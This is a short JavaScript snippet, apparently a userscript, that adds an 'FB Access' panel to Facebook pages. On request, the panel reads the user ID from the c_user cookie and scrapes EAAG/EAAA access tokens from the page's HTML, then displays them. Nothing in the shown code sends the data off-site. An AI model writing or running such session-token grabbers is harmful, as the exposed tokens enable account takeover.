(function() {
    const style = document.createElement('style');
    style.textContent = `
        #floatBtn { position: fixed; bottom: 10vw; right: 7vw; z-index: 2147483647; width: 12vw; height: 12vw; background: #0866FF; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 5vw; box-shadow: 0 3px 8px rgba(0,0,0,0.4); border: 0.4vw solid white; }
        #guard-modal { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #fdfafa; z-index: 2147483646; padding: 4vw; box-sizing: border-box; display: none; overflow-y: auto; font-family: sans-serif; }
        .section-box { background: #e8e8e8; padding: 4vw; border-radius: 2vw; margin-bottom: 3vw; }
        .access-area { width: 100%; height: 15vw; font-size: 2.5vw; border-radius: 2vw; padding: 2vw; box-sizing: border-box; background: #111; color: #0bfa31; border: none; resize: none; margin-bottom: 2vw; font-family: monospace !important; word-break: break-all; }
        .btn-main { width: 100%; padding: 3vw; background: #0866FF; color: white; border-radius: 2.5vw; border: none; font-weight: bold; font-size: 4vw; cursor: pointer; }
        #mStatus { text-align:center; font-weight:bold; font-size:6vw; color:#888; margin-top: 5vw; }
    `;
    document.head.appendChild(style);

    const container = document.createElement('div');
    container.innerHTML = `
        <div id="floatBtn">💾️</div>
        <div id="guard-modal">
            <h1 style="text-align:center; font-size:7vw; color:#3c3c3c;">FB <span style="color:#0866FF;">Access</span></h1>
            <div class="section-box">
                <button id="mGetAccess" class="btn-main">FETCH TOKEN SEKARANG</button>
                <div id="contentAccess" style="display:none; margin-top:4vw;">
                    <label style="font-size:3vw; font-weight:bold;">ID:</label>
                    <textarea id="resId" class="access-area" readonly></textarea>
                    <label style="font-size:3vw; font-weight:bold;">TOKEN (EAAG):</label>
                    <textarea id="resToken" class="access-area" readonly placeholder="Mencari..."></textarea>
                </div>
            </div>
            <p id="mStatus">Notification</p>
        </div>
    `;
    document.body.appendChild(container);

    const modal = document.getElementById('guard-modal');
    const floatBtn = document.getElementById('floatBtn');
    const status = document.getElementById('mStatus');

    floatBtn.onclick = () => modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';

    document.getElementById('mGetAccess').onclick = function() {
        this.innerText = "Processing...";
        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Gagal";
        document.getElementById('resId').value = uid;

        // Jalur alternatif: Mengambil dari window FB langsung
        try {
            const html = document.documentElement.innerHTML;
            // Mencari token yang tersimpan di dalam script internal FB
            const tokenMatch = html.match(/(EAAG\w+)/) || html.match(/(EAAA\w+)/);
            
            if (tokenMatch) {
                document.getElementById('resToken').value = tokenMatch[1];
                document.getElementById('contentAccess').style.display = 'block';
                status.innerHTML = '<span style="color:#00df1f;">Berhasil!</span>';
            } else {
                // Jika tidak ada di HTML, arahkan user ke URL token
                status.innerHTML = '<span style="color:red;">Token tidak ditemukan di halaman ini.</span>';
                window.open('https://business.facebook.com/business_locations', '_blank');
            }
        } catch (e) {
            status.innerHTML = '<span style="color:red;">Error Fetching!</span>';
        }
        this.innerText = "FETCH TOKEN SEKARANG";
    };
})();
